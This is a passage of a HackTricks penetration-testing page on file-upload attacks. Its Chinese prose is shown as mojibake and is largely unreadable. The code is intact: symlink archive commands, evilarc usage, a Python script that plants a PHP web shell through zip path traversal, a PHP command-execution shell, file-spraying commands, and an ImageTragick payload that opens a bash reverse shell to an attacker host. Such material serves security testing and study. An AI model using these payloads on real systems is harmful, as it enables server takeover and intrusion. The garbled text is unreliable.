* ç‰¹åˆ¶PDFæ–‡ä»¶åˆ°XSSï¼š[ä»¥ä¸‹é¡µé¢å±•ç¤ºäº†å¦‚ä½•**æ³¨å…¥PDFæ•°æ®ä»¥æ‰§è¡ŒJS**](../xss-cross-site-scripting/pdf-injection.md)ã€‚å¦‚æœæ‚¨å¯ä»¥ä¸Šä¼ PDFæ–‡ä»¶ï¼Œæ‚¨å¯ä»¥æ ¹æ®ç»™å®šçš„æŒ‡ç¤ºå‡†å¤‡ä¸€äº›å°†æ‰§è¡Œä»»æ„JSçš„PDFæ–‡ä»¶ã€‚
* ä¸Šä¼ \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt))å†…å®¹ä»¥æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦æœ‰ä»»ä½•**é˜²ç—…æ¯’è½¯ä»¶**
* æ£€æŸ¥ä¸Šä¼ æ–‡ä»¶æ˜¯å¦æœ‰ä»»ä½•**å¤§å°é™åˆ¶**

ä»¥ä¸‹æ˜¯æ‚¨å¯ä»¥é€šè¿‡ä¸Šä¼ å®ç°çš„å‰10é¡¹äº‹é¡¹åˆ—è¡¨ï¼ˆæ¥è‡ª[æ­¤å¤„](https://twitter.com/SalahHasoneh1/status/1281274120395685889)ï¼‰ï¼š

1. **ASP / ASPX / PHP5 / PHP / PHP3**ï¼šWebshell / RCE
2. **SVG**ï¼šå­˜å‚¨å‹XSS / SSRF / XXE
3. **GIF**ï¼šå­˜å‚¨å‹XSS / SSRF
4. **CSV**ï¼šCSVæ³¨å…¥
5. **XML**ï¼šXXE
6. **AVI**ï¼šLFI / SSRF
7. **HTML / JS**ï¼šHTMLæ³¨å…¥ / XSS / å¼€æ”¾é‡å®šå‘
8. **PNG / JPEG**ï¼šåƒç´ æ´ªæ°´æ”»å‡»ï¼ˆDoSï¼‰
9. **ZIP**ï¼šé€šè¿‡LFIçš„RCE / DoS
10. **PDF / PPTX**ï¼šSSRF / BLIND XXE

#### Burpæ‰©å±•

{% embed url="https://github.com/portswigger/upload-scanner" %}

## é­”æœ¯å¤´å­—èŠ‚

* **PNG**ï¼š`"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**ï¼š`"\xff\xd8\xff"`

è¯·å‚è€ƒ[https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures)è·å–å…¶ä»–æ–‡ä»¶ç±»å‹ã€‚

### Zip/Taræ–‡ä»¶è‡ªåŠ¨è§£å‹ä¸Šä¼ 

å¦‚æœæ‚¨å¯ä»¥ä¸Šä¼ ä¸€ä¸ªå°†åœ¨æœåŠ¡å™¨å†…éƒ¨è§£å‹ç¼©çš„ZIPæ–‡ä»¶ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œä¸¤é¡¹æ“ä½œï¼š

#### ç¬¦å·é“¾æ¥

ä¸Šä¼ ä¸€ä¸ªåŒ…å«æŒ‡å‘å…¶ä»–æ–‡ä»¶çš„è½¯é“¾æ¥çš„é“¾æ¥ï¼Œç„¶åï¼Œè®¿é—®è§£å‹ç¼©çš„æ–‡ä»¶ï¼Œæ‚¨å°†è®¿é—®é“¾æ¥çš„æ–‡ä»¶ï¼š
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### åœ¨ä¸åŒæ–‡ä»¶å¤¹ä¸­è§£å‹ç¼©

åœ¨è§£å‹ç¼©è¿‡ç¨‹ä¸­æ„å¤–åœ¨ç›®å½•ä¸­åˆ›å»ºæ–‡ä»¶æ˜¯ä¸€ä¸ªé‡è¦é—®é¢˜ã€‚å°½ç®¡æœ€åˆçš„å‡è®¾æ˜¯è¿™ç§è®¾ç½®å¯èƒ½ä¼šé˜²æ­¢é€šè¿‡æ¶æ„æ–‡ä»¶ä¸Šä¼ è¿›è¡ŒOSçº§åˆ«çš„å‘½ä»¤æ‰§è¡Œï¼Œä½†ZIPå­˜æ¡£æ ¼å¼çš„åˆ†å±‚å‹ç¼©æ”¯æŒå’Œç›®å½•éå†åŠŸèƒ½å¯ä»¥è¢«åˆ©ç”¨ã€‚è¿™ä½¿å¾—æ”»å‡»è€…å¯ä»¥é€šè¿‡æ“çºµç›®æ ‡åº”ç”¨ç¨‹åºçš„è§£å‹ç¼©åŠŸèƒ½æ¥ç»•è¿‡é™åˆ¶å¹¶é€ƒç¦»å®‰å…¨ä¸Šä¼ ç›®å½•ã€‚

ä¸€ä¸ªè‡ªåŠ¨åŒ–åˆ©ç”¨ç¨‹åºå¯ä»¥ç”¨äºåˆ›å»ºè¿™æ ·çš„æ–‡ä»¶ï¼Œå¯ä»¥åœ¨[**GitHubä¸Šçš„evilarc**](https://github.com/ptoomey3/evilarc)æ‰¾åˆ°ã€‚è¯¥å®ç”¨ç¨‹åºçš„ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
æ­¤å¤–ï¼Œ**ä½¿ç”¨evilarcçš„ç¬¦å·é“¾æ¥æŠ€å·§**ä¹Ÿæ˜¯ä¸€ç§é€‰æ‹©ã€‚å¦‚æœç›®æ ‡æ˜¯é’ˆå¯¹ç±»ä¼¼`/flag.txt`è¿™æ ·çš„æ–‡ä»¶ï¼Œåº”åœ¨æ‚¨çš„ç³»ç»Ÿä¸­åˆ›å»ºæŒ‡å‘è¯¥æ–‡ä»¶çš„ç¬¦å·é“¾æ¥ã€‚è¿™å¯ä»¥ç¡®ä¿evilarcåœ¨æ“ä½œè¿‡ç¨‹ä¸­ä¸ä¼šé‡åˆ°é”™è¯¯ã€‚

ä»¥ä¸‹æ˜¯ç”¨äºåˆ›å»ºæ¶æ„zipæ–‡ä»¶çš„Pythonä»£ç ç¤ºä¾‹ï¼š
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**åˆ©ç”¨å‹ç¼©è¿›è¡Œæ–‡ä»¶å–·å°„**

æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹**åŸå§‹å¸–å­**ï¼š[https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)


1. **åˆ›å»º PHP Shell**ï¼š
ç¼–å†™ PHP ä»£ç ä»¥æ‰§è¡Œé€šè¿‡ `$_REQUEST` å˜é‡ä¼ é€’çš„å‘½ä»¤ã€‚
```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2. **æ–‡ä»¶å–·å°„å’Œå‹ç¼©æ–‡ä»¶åˆ›å»º**ï¼š
åˆ›å»ºå¤šä¸ªæ–‡ä»¶ï¼Œå¹¶ç»„è£…ä¸€ä¸ªåŒ…å«è¿™äº›æ–‡ä»¶çš„ zip å­˜æ¡£ã€‚
```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3. **ä½¿ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨æˆ– vi è¿›è¡Œä¿®æ”¹**ï¼š
ä½¿ç”¨ vi æˆ–åå…­è¿›åˆ¶ç¼–è¾‘å™¨æ›´æ”¹ zip æ–‡ä»¶ä¸­æ–‡ä»¶çš„åç§°ï¼Œå°† "xxA" æ›´æ”¹ä¸º "../" ä»¥éå†ç›®å½•ã€‚
```vi
:set modifiable
:%s/xxA/..\//g
:x!
```


## ImageTragic

å°†æ­¤å†…å®¹ä¸å›¾åƒæ‰©å±•åä¸Šä¼ ä»¥åˆ©ç”¨æ¼æ´**(ImageMagickï¼Œ7.0.1-1)**
(æ¥è‡ª[exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## å°† PHP Shell åµŒå…¥ PNG

åœ¨ PNG æ–‡ä»¶çš„ IDAT å—ä¸­åµŒå…¥ PHP Shell å¯ä»¥æœ‰æ•ˆåœ°ç»•è¿‡æŸäº›å›¾åƒå¤„ç†æ“ä½œã€‚PHP-GD ä¸­çš„ `imagecopyresized` å’Œ `imagecopyresampled` å‡½æ•°åœ¨è¿™ç§æƒ…å†µä¸‹ç‰¹åˆ«ç›¸å…³ï¼Œå› ä¸ºå®ƒä»¬é€šå¸¸ç”¨äºè°ƒæ•´å¤§å°å’Œé‡é‡‡æ ·å›¾åƒã€‚åµŒå…¥çš„ PHP Shell èƒ½å¤Ÿåœ¨è¿™äº›æ“ä½œä¸­ä¿æŒä¸å—å½±å“ï¼Œå¯¹äºæŸäº›ç”¨ä¾‹æ¥è¯´æ˜¯ä¸€ä¸ªé‡è¦ä¼˜åŠ¿ã€‚

å…³äºè¿™ç§æŠ€æœ¯çš„è¯¦ç»†æ¢è®¨ï¼ŒåŒ…æ‹¬æ–¹æ³•è®ºå’Œæ½œåœ¨åº”ç”¨ï¼Œå¯ä»¥åœ¨ä»¥ä¸‹æ–‡ç« ä¸­æ‰¾åˆ°ï¼š["åœ¨ PNG IDAT å—ä¸­ç¼–ç  Web Shell"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)ã€‚è¿™ä¸ªèµ„æºæä¾›äº†å¯¹è¯¥è¿‡ç¨‹åŠå…¶å½±å“çš„å…¨é¢ç†è§£ã€‚

æ›´å¤šä¿¡æ¯è¯·å‚é˜…ï¼š[https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## å¤šè¯­æ–‡ä»¶

å¤šè¯­æ–‡ä»¶åœ¨ç½‘ç»œå®‰å…¨ä¸­æ‰®æ¼”ç€ç‹¬ç‰¹çš„è§’è‰²ï¼Œå®ƒä»¬æ˜¯å˜è‰²é¾™ï¼Œå¯ä»¥åŒæ—¶æœ‰æ•ˆåœ°å­˜åœ¨äºå¤šç§æ–‡ä»¶æ ¼å¼ä¸­ã€‚ä¸€ä¸ªæœ‰è¶£çš„ä¾‹å­æ˜¯ [GIFAR](https://en.wikipedia.org/wiki/Gifar)ï¼Œå®ƒæ˜¯ GIF å’Œ RAR å­˜æ¡£çš„æ··åˆä½“ã€‚è¿™æ ·çš„æ–‡ä»¶ä¸ä»…é™äºè¿™ç§ç»„åˆï¼›åƒ GIF å’Œ JS æˆ– PPT å’Œ JS çš„ç»„åˆä¹Ÿæ˜¯å¯è¡Œçš„ã€‚

å¤šè¯­æ–‡ä»¶çš„æ ¸å¿ƒä½œç”¨åœ¨äºå®ƒä»¬èƒ½å¤Ÿè§„é¿åŸºäºæ–‡ä»¶ç±»å‹ç­›é€‰æ–‡ä»¶çš„å®‰å…¨æªæ–½ã€‚å„ç§åº”ç”¨ç¨‹åºçš„å¸¸è§åšæ³•åŒ…æ‹¬ä»…å…è®¸ä¸Šä¼ ç‰¹å®šæ–‡ä»¶ç±»å‹ï¼Œå¦‚ JPEGã€GIF æˆ– DOCï¼Œä»¥å‡è½»æ½œåœ¨æœ‰å®³æ ¼å¼ï¼ˆå¦‚ JSã€PHP æˆ– Phar æ–‡ä»¶ï¼‰å¸¦æ¥çš„é£é™©ã€‚ç„¶è€Œï¼Œå¤šè¯­æ–‡ä»¶é€šè¿‡ç¬¦åˆå¤šç§æ–‡ä»¶ç±»å‹çš„ç»“æ„æ ‡å‡†ï¼Œå¯ä»¥å·§å¦™åœ°ç»•è¿‡è¿™äº›é™åˆ¶ã€‚

å°½ç®¡å¤šè¯­æ–‡ä»¶å…·æœ‰é€‚åº”æ€§ï¼Œä½†ä¹Ÿå­˜åœ¨ä¸€äº›é™åˆ¶ã€‚ä¾‹å¦‚ï¼Œè™½ç„¶ä¸€ä¸ªå¤šè¯­æ–‡ä»¶å¯èƒ½åŒæ—¶åŒ…å« PHAR æ–‡ä»¶ï¼ˆPHp ARchiveï¼‰å’Œ JPEGï¼Œä½†å…¶ä¸Šä¼ æˆåŠŸå¯èƒ½å–å†³äºå¹³å°çš„æ–‡ä»¶æ‰©å±•åç­–ç•¥ã€‚å¦‚æœç³»ç»Ÿå¯¹å…è®¸çš„æ‰©å±•åè¦æ±‚ä¸¥æ ¼ï¼Œé‚£ä¹ˆå¤šè¯­æ–‡ä»¶çš„ç»“æ„åŒé‡æ€§å¯èƒ½ä¸è¶³ä»¥ä¿è¯å…¶ä¸Šä¼ æˆåŠŸã€‚

æ›´å¤šä¿¡æ¯è¯·å‚é˜…ï¼š[https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## å‚è€ƒèµ„æ–™

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)


<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**æ¼æ´èµé‡‘æç¤º**ï¼š**æ³¨å†Œ** Intigritiï¼Œä¸€ä¸ªç”±é»‘å®¢åˆ›å»ºçš„é«˜çº§**æ¼æ´èµé‡‘å¹³å°**ï¼ç«‹å³åŠ å…¥æˆ‘ä»¬ï¼Œè®©æ‚¨çš„èµé‡‘é«˜è¾¾**$100,000**ï¼[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šæˆ–**ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFT](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live) ä¸Š**å…³æ³¨**æˆ‘ä»¬ã€‚
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
